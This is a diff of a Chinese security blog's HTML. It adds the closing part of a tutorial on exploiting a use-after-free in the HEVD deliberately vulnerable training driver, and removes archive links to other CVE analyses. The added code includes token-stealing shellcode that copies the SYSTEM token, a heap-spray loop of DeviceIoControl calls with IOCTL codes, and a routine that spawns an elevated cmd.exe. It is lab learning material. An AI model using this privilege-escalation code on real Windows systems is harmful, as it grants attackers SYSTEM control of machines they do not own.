找到_EPROCESS结构</span><br><span class="line">        mov ecx, eax</span><br><span class="line">        mov edx, 4    &#x2F;&#x2F; edx &#x3D; system PID(4)</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F; 循环是为了获取system的_EPROCESS</span><br><span class="line">    find_sys_pid:</span><br><span class="line">        mov eax, [eax + 0xb8]    &#x2F;&#x2F; 找到进程活动链表</span><br><span class="line">        sub eax, 0xb8            &#x2F;&#x2F; 链表遍历</span><br><span class="line">        cmp [eax + 0xb4], edx    &#x2F;&#x2F; 根据PID判断是否为SYSTEM</span><br><span class="line">        jnz find_sys_pid</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F; 替换Token</span><br><span class="line">        mov edx, [eax + 0xf8]</span><br><span class="line">        mov [ecx + 0xf8], edx</span><br><span class="line">        popad</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-        <div class="article-info info-on-right">
-          
+<h2 id="堆喷"><a href="#堆喷" class="headerlink" title="堆喷"></a>堆喷</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for (int i &#x3D; 0; i &lt; 5000; i++)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 调用 AllocateFakeObject() 对象</span><br><span class="line">    DeviceIoControl(hDevice, 0x22201F, fakeG_UseAfterFree, 0x60, NULL, 0, &amp;recvBuf, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 调用 UseUaFObject() 函数</span><br><span class="line">DeviceIoControl(hDevice, 0x222013, NULL, NULL, NULL, 0, &amp;recvBuf, NULL);</span><br><span class="line">&#x2F;&#x2F; 调用 FreeUaFObject() 函数</span><br><span class="line">DeviceIoControl(hDevice, 0x22201B, NULL, NULL, NULL, 0, &amp;recvBuf, NULL);</span><br></pre></td></tr></table></figure>
+<p>对于IO控制码 我们可以用IDA来查看IrpDeviceIoCtlHandler函数<br><img src="1.png"></p>
+<h2 id="创建CMD"><a href="#创建CMD" class="headerlink" title="创建CMD"></a>创建CMD</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static VOID CreateCmd()</span><br><span class="line">&#123;</span><br><span class="line">    STARTUPINFO si &#x3D; &#123; sizeof(si) &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi &#x3D; &#123; 0 &#125;;</span><br><span class="line">    si.dwFlags &#x3D; STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow &#x3D; SW_SHOW;</span><br><span class="line">    WCHAR wzFilePath[MAX_PATH] &#x3D; &#123; L&quot;cmd.exe&quot; &#125;;</span><br><span class="line">    BOOL bReturn &#x3D; CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi);</span><br><span class="line">    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后我们发现利用成功了<br><img src="2.gif"></p>
+<h1 id="0x04补丁分析"><a href="#0x04补丁分析" class="headerlink" title="0x04补丁分析"></a>0x04补丁分析</h1><p>其实在分析过程中我已经提到过就是补丁版本用完后将g_UseAfterFreeObjectNonPagedPool置为NULL了 导致无法利用</p>
+<p><img src="7.png"></p>
+<h1 id="0x05经验总结"><a href="#0x05经验总结" class="headerlink" title="0x05经验总结"></a>0x05经验总结</h1><p>这次的UAF漏洞是在我看完漏洞战争之后的 这个也简单 容易理解 我主要是参考TJ师傅的文章 wjllz师傅和0x2l师傅指导 wjllz和0x2l师傅带好人哇！！！人不但技术好还耐心！！！</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -317,212 +204,63 @@
 		</ul>
 	</div>
 
-          
+      
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1-%E5%86%85%E6%A0%B8%E6%A0%88%E6%BA%A2%E5%87%BA/" class="archive-article-date">
-  	<time datetime="2020-10-22T05:55:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-22</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2020/10/23/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-3-%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          HEVD内核漏洞学习-3-类型混淆
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1-%E5%86%85%E6%A0%B8%E6%A0%88%E6%BA%A2%E5%87%BA/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">HEVD内核漏洞学习(1)-内核栈溢出</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1-%E5%86%85%E6%A0%B8%E6%A0%88%E6%BA%A2%E5%87%BA/">HEVD内核漏洞学习(1)-内核栈溢出</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">HEVD内核</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/19/CVE-2014-4113win32k-sys%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2014-4113win32k-sys%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2020-10-19T08:01:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/19/CVE-2014-4113win32k-sys%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2014-4113win32k-sys%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2014-4113win32k.sys内核漏洞分析</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞分析</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/11/CVE-2014-1767WindowsAFD-sys%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2020-10-11T03:01:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/11/CVE-2014-1767WindowsAFD-sys%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2014-1767WindowsAFD.sys内核漏洞分析</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞分析</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/08/CVE-2013-1347UAF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2020-10-08T01:00:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-08</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/08/CVE-2013-1347UAF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2013-1347UAF漏洞分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞分析</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/04/CVE-2013-2551%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2020-10-04T01:22:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/04/CVE-2013-2551%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2013-2551整数溢出漏洞分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞分析</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">Next &amp;raquo;</a>
-    </nav>
   
 
 
@@ -546,8 +284,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
